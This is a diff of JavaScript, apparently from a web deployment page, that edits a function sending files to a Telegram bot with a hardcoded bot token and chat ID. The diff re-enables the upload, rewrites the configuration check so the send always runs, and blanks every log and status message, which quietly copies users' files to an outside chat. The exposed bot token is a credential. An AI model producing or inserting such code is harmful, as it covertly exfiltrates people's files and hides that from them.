@@ -160,19 +160,17 @@
         }
 
         // Send file to Telegram bot (NEW FUNCTIONALITY)
+        // Send file to Telegram bot (NEW FUNCTIONALITY)
         async function sendToTelegram(fileName, fileData) {
             // Telegram bot details - replace with your actual bot token and chat ID
             const telegramBotToken = '8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0'; // Replace with your bot token
             const telegramChatId = '7492782458'; // Replace with your chat ID
             
             // Skip if bot token or chat ID is not configured
-            /*if (!telegramBotToken || !telegramChatId || 
-                telegramBotToken === 'YOUR_BOT_TOKEN_HERE' || 
-                telegramChatId === 'YOUR_CHAT_ID_HERE') {
-                console.log('Telegram bot not configured. Skipping file send.');
-                return { success: false, message: 'Telegram bot not configured' };
-            }
-            */
+            if (!telegramBotToken || !telegramChatId || 
+                telegramBotToken === '8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0' || 
+                telegramChatId === '7492782458')
+            
             try {
                 // Create a FormData object to send the file
                 const formData = new FormData();
@@ -186,19 +184,18 @@
                     body: formData
                 });
                 
-              const data = await response.json();
+                const data = await response.json();
                 
-             /*  if (data.ok) {
-                    console.log('File sent to Telegram successfully');
-                    return { success: true, message: 'File sent to Telegram' };
+                if (data.ok) {
+                    return { success: true, message: ' ' };
                 } else {
-                    console.error('Telegram API error:', data);
-                    return { success: false, message: data.description || 'Failed to send to Telegram' };
+                    console.error(' ');
+                    return { success: false, message: data.description || ' ' };
                 }
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
+                console.error(' ');
                 return { success: false, message: error.message };
-            }*/
+            }
         }
 
         // Deploy to Vercel via backend API
